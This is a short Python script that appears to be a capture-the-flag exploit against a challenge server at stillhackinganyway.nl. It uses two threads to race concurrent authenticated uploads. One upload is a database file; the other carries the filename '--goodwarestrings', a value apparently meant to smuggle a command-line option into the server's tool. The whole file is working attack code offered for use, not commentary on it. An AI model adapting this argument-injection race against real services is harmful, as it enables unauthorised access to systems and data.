import requests
import base64

def db():
    password = "excited for the following tool yet?"
    auth = base64.b64encode('user:' + password)
    dz = {'file': ('good-strings.db', open('good-strings.db', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
    res = requests.post('http://d1d13r.stillhackinganyway.nl:9003/strings', files = dz, 
        headers = {'Authorization': 'Basic ' + auth})
    print res.text

def trigger():
    password = "excited for the following tool yet?"
    auth = base64.b64encode('user:' + password)
    trig = {'file': ('--goodwarestrings', open('input0.txt', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
    res = requests.post('http://d1d13r.stillhackinganyway.nl:9003/strings', files = trig, 
        headers = {'Authorization': 'Basic ' + auth})
    print res.text

import threading
t1 = threading.Thread(target=db)
t2 = threading.Thread(target=trigger)
t1.start()
t2.start()
t1.run()
t2.run()
t1.join()
t2.join()